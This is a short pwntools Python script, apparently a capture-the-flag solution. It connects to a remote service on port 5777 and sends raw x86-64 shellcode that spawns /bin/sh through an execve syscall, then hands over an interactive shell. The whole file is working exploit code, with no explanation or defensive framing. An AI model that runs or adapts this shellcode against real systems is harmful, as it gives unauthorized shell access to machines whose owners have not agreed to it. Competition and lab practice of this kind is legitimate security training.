from pwn import * 

p = remote("d4rkc0de.iiitd.edu.in",5777)

p.recvline()

sh = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

p.sendline(sh)

p.interactive()
p.interactive()
p.close()